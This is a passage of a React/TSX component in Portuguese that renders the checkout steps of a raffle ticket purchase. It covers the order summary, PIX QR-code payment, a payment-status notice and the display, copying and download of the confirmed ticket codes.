                    <div className="flex justify-between items-center text-gray-600">
                      <span>Método do Sorteio:</span>
                      <span className="font-semibold text-gray-800">{config.lotteryMethod}</span>
                    </div>
                    <div className="flex justify-between items-center pt-2 border-t border-gray-200 text-sm">
                      <span className="font-black text-gray-900">Total a Pagar via PIX:</span>
                      <span className="text-xl font-black text-[#4d8227]">
                        R$ {currentTotalFormatted}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Footer do Card com Selos de Garantia */}
                <div className="bg-emerald-50/60 border-t border-emerald-100 px-4 py-2 flex items-center justify-between text-[11px] text-emerald-900">
                  <div className="flex items-center gap-1.5 font-semibold">
                    <ShieldCheck className="w-4 h-4 text-emerald-700" />
                    <span>Emissão Imediata dos Bilhetes</span>
                  </div>
                  <span className="text-[10px] font-bold text-emerald-700 bg-emerald-100 px-2 py-0.5 rounded-full">
                    PIX Seguro Automático
                  </span>
                </div>
              </div>

              {/* Botões de Ação */}
              <div className="grid grid-cols-2 gap-3 mt-1">
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => setStep(2)}
                  disabled={loading}
                  className="h-12 text-sm font-semibold border-gray-300 hover:bg-gray-100 rounded-xl cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <ArrowLeft className="w-4 h-4" />
                  <span>Voltar</span>
                </Button>

                <Button
                  type="button"
                  onClick={handleConfirmAndPay}
                  disabled={loading}
                  className="h-12 text-sm sm:text-base font-extrabold text-white bg-[#4d8227] hover:bg-[#437222] disabled:bg-[#4d8227]/70 rounded-xl shadow-xs transition-all cursor-pointer flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <span className="flex items-center justify-center gap-2">
                      <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span>
                      <span>Gerando PIX Oficial...</span>
                    </span>
                  ) : (
                    <>
                      <span>Gerar PIX e Concorrer</span>
                      <ArrowRight className="w-4 h-4" />
                    </>
                  )}
                </Button>
              </div>
            </div>
          )}

          {/* ================================================================= */}
          {/* ETAPA 4: PAGAMENTO PIX (QR CODE & COPIA E COLA)                   */}
          {/* ================================================================= */}
          {step === 4 && tickets.length === 0 && pixData && (
            <div className="flex flex-col items-center gap-4 py-1">
              {/* Box do QR Code */}
              <div className="flex flex-col items-center justify-center p-4 bg-white border border-gray-200 rounded-2xl shadow-xs w-full max-w-[320px]">
                {qrCodeSrc ? (
                  <img
                    src={qrCodeSrc}
                    alt="QR Code PIX Oficial"
                    className="w-56 h-56 object-contain rounded-lg"
                  />
                ) : (
                  <div className="w-56 h-56 flex flex-col items-center justify-center bg-gray-50 border border-dashed border-gray-200 rounded-lg gap-2 text-xs text-gray-400">
                    <span className="w-6 h-6 border-2 border-[#4d8227] border-t-transparent rounded-full animate-spin"></span>
                    <span>Carregando QR Code...</span>
                  </div>
                )}
                <span className="text-xs font-semibold text-gray-500 mt-2.5 text-center">
                  Aponte a câmera do aplicativo do seu banco
                </span>
              </div>

              {/* PIX Copia e Cola */}
              <div className="w-full flex flex-col gap-2">
                <Label className="text-xs font-bold text-gray-700 flex items-center gap-1.5">
                  <Copy className="w-3.5 h-3.5 text-[#4d8227]" />
                  <span>Código PIX Copia e Cola:</span>
                </Label>
                <div className="flex gap-2">
                  <Input
                    readOnly
                    value={pixData.pixCopiaCola}
                    className="text-xs font-mono h-11 bg-gray-50/70 border-gray-300 rounded-lg select-all"
                  />
                  <Button
                    onClick={handleCopyPix}
                    className="bg-[#4d8227] hover:bg-[#437222] text-white font-extrabold px-5 h-11 rounded-lg shrink-0 cursor-pointer shadow-xs active:scale-98 transition-all flex items-center gap-1.5"
                  >
                    {copiedPix ? (
                      <>
                        <Check className="w-4 h-4" />
                        <span>Copiado!</span>
                      </>
                    ) : (
                      <>
                        <Copy className="w-4 h-4" />
                        <span>Copiar</span>
                      </>
                    )}
                  </Button>
                </div>
              </div>

              {/* Status ao vivo */}
              <div className="w-full flex items-center justify-center gap-2.5 px-4 py-2.5 bg-amber-50/70 border border-amber-200/80 rounded-xl text-xs text-amber-900 text-center leading-relaxed">
                <span className="relative flex h-2.5 w-2.5 shrink-0">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500"></span>
                </span>
                <span>
                  Aguardando confirmação do banco... Ao pagar, seus bilhetes de 6 dígitos surgirão aqui instantaneamente.
                </span>
              </div>
            </div>
          )}

          {/* ================================================================= */}
          {/* TELA FINAL: BILHETES CONFIRMADOS APÓS PAGAMENTO                    */}
          {/* ================================================================= */}
          {tickets.length > 0 && (
            <div className="flex flex-col gap-4 py-1">
              <div className="flex flex-col items-center gap-1.5 py-3 px-4 bg-gradient-to-b from-green-50 to-white border border-green-200 rounded-xl text-center">
                <Sparkles className="w-8 h-8 text-green-600" />
                <p className="text-sm font-bold text-green-800">
                  Pagamento confirmado! Seus <span className="text-green-600 font-extrabold">{tickets.length} números</span> estão concorrendo!
                </p>
                <p className="text-xs text-green-700 opacity-80">
                  Guarde seus códigos abaixo — eles são seus bilhetes oficiais
                </p>
              </div>

              {proofToken && (
                <div className="flex items-center justify-between bg-emerald-50/80 border border-emerald-200 rounded-lg px-3 py-2 text-xs text-emerald-800">
                  <div className="flex items-center gap-1.5 font-medium">
                    <ShieldCheck className="w-4 h-4 text-emerald-700" />
                    <span>Autenticado via <strong>AES-256-GCM</strong></span>
                  </div>
                  <span className="font-mono text-[10px] text-emerald-900 font-bold bg-white px-2 py-0.5 rounded border border-emerald-200">
                    RECIBO: {proofToken.substring(0, 10)}
                  </span>
                </div>
              )}

              {/* Lista dos bilhetes */}
              <div className="max-h-56 overflow-y-auto rounded-xl border border-gray-200 bg-gray-50 p-2 flex flex-col gap-1">
                {tickets.map((t, idx) => (
                  <div
                    key={t.code + idx}
                    className="flex items-center justify-between bg-white border border-gray-100 rounded-lg px-3 py-2 shadow-2xs"
                  >
                    <span className="text-[11px] text-gray-400 font-semibold font-sans w-6 shrink-0">
                      #{String(idx + 1).padStart(2, "0")}
                    </span>
                    <span className="flex-1 text-center text-base font-extrabold text-[#4d8227] tracking-widest font-mono">
                      {t.code}
                    </span>
                    <span className="text-[10px] text-green-600 font-bold bg-green-50 border border-green-100 rounded px-1.5 py-0.5 shrink-0">
                      ATIVO
                    </span>
                  </div>
                ))}
              </div>

              {/* Botões de Ação dos Bilhetes */}
              <div className="grid grid-cols-2 gap-2 mt-1">
                <Button
                  onClick={handleCopyAllTickets}
                  variant="outline"
                  className="w-full flex items-center justify-center gap-2 border-[#4d8227] text-[#4d8227] hover:bg-[#4d8227]/10 text-sm font-semibold h-11 rounded-xl"
                >
                  <Copy className="w-4 h-4" />
                  {copiedCodes ? "✅ Copiado!" : "Copiar Todos"}
                </Button>

                <Button
                  onClick={handleDownloadTxt}
                  className="w-full flex items-center justify-center gap-2 bg-[#4d8227] hover:bg-[#437422] text-white text-sm font-semibold h-11 rounded-xl"
                >
                  <Download className="w-4 h-4" />
                  <span>Salvar TXT</span>
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </>
  );
}
